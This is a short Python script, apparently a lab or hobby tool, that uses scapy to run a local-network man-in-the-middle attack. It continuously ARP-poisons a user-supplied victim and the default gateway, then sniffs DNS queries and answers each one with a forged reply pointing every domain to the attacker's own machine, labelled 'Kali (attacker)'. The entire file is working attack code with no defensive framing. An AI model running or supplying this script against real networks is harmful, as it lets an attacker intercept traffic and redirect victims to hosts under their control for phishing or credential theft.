from scapy.all import *
import os
from threading import Thread
import time


victim_ip = input("Enter the Victim IP address: ")
gateway_ip = os.popen("ip route | grep default").read().split()[2]
my_ip = get_if_addr("eth0")


victim_mac = getmacbyip(victim_ip)
gateway_mac = getmacbyip(gateway_ip)

print("Gateway IP:", gateway_ip)
print("Gateway MAC:", gateway_mac)
print("Kali (attacker) IP:", my_ip)



def arp_poison(target_ip, target_mac, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=get_if_hwaddr("eth0"))
    while True:
        sendp(Ether(dst=target_mac)/packet, iface="eth0", verbose=0)
        time.sleep(2)


def spoof_dns(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
        domain = pkt[DNS].qd.qname.decode().strip()
        src_ip = pkt[IP].src
        print(f"[+] Spoofing DNS for: {domain}")
     
        spoofed_pkt = (
            IP(dst=pkt[IP].src, src=pkt[IP].dst) /
            UDP(dport=pkt[UDP].sport, sport=53) /
            DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=domain, ttl=300, rdata=my_ip)
            )
        )
        send(spoofed_pkt, verbose=0)

Thread(target=arp_poison, args=(victim_ip, victim_mac, gateway_ip)).start()
Thread(target=arp_poison, args=(gateway_ip, gateway_mac, victim_ip)).start()

try:
    sniff(filter="udp port 53", iface="eth0", prn=spoof_dns)
except KeyboardInterrupt:
    print("\n[+] Stopped sniffing")
